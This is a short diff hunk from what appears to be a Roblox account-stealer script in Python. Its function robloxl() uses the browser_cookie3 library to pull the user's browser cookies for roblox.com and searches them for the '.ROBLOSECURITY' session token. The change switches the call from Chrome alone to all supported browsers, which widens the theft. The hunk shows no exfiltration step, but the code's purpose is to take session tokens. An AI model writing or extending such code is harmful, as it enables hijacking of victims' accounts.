@@ -7,7 +7,7 @@ def robloxl():
     data = [] 
 
     try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
+        cookies = browser_cookie3.call(domain_name='roblox.com')    
         for cookie in cookies:
             print(cookie)
             if cookie.name == '.ROBLOSECURITY':
